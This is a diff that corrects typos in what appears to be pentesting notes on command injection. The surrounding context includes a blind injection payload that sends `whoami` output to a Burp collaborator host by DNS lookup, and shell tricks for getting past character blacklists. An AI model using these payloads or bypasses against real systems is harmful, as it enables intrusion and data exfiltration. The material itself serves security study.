@@ -101,7 +101,7 @@ x||nslookup `whoami`.<burp-collab-payload>||
 
 ### Escaping Blacklists
 
-Blacklists prevent certain characters or words from being accepted as input. However, this isn't the beste defence mechanism as there are many replacements and substitutions we can use instead.
+Blacklists prevent certain characters or words from being accepted as input. However, this isn't the beset defense mechanism as there are many replacements and substitutions we can use instead.
 
 > All techniques are explained [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection).
 #### Space
@@ -120,7 +120,7 @@ We can use string slicing on environment variables to use blacklisted characters
 ```bash
 ${PATH:0:1}
 ```
-* The `;` semicolon can be obrained from the `LS_COLORS` variable:
+* The `;` semicolon can be obtained from the `LS_COLORS` variable:
 ```bash
 ${LS_COLORS:10:1}
 ```
@@ -130,7 +130,7 @@ ${LS_COLORS:10:1}
 #### Character Shifting
 
 We can use the ASCII table and shift from normal characters to ones that are blacklisted.
-* We want the `\` character, so we shift by 1 the `[` characater that is directly before it in the ASCII table.
+* We want the `\` character, so we shift by 1 the `[` character that is directly before it in the ASCII table.
 ```bash
 $(tr '!-}' '"-~'<<<[)
 ```
